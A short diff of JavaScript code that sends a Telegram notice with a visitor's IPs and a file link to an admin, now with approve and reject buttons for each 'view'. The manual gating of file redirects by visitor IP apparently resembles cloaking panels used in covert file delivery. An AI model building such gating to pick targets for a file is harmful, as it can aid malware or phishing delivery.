@@ -272,7 +272,7 @@
 
     async function sendAdminApprovalRequest({ sessionId, currentIp, passedIp, chatId, fileUrl }) {
       const text =
-        `🔔 <b>CHUYỂN HƯỚNG NHẬN FILE</b>\n` +
+        `🔔 <b>có view mới cần check chicong ơiiiiii</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━\n` +
         `✅ IP: <code>${currentIp}</code>` +
         (passedIp && passedIp !== currentIp ? ` (IP ban đầu: <code>${passedIp}</code>)` : "") + `\n` +
@@ -281,7 +281,14 @@
         `📁 Link file: ${fileUrl}\n` +
         `🕒 Thời gian: <i>${new Date().toLocaleString("vi-VN")}</i>`;
 
-      const sentAdmin = await sendTelegramNotice(ADMIN_CHAT_ID, text);
+      const keyboard = {
+        inline_keyboard: [[
+          { text: "✅ Duyệt view", callback_data: `approve:${sessionId || currentIp}` },
+          { text: "❌ Từ chối view", callback_data: `reject:${sessionId || currentIp}` }
+        ]]
+      };
+
+      const sentAdmin = await sendTelegramNotice(ADMIN_CHAT_ID, text, keyboard);
       if (chatId && String(chatId).trim() !== String(ADMIN_CHAT_ID)) {
         await sendTelegramNotice(
           String(chatId).trim(),
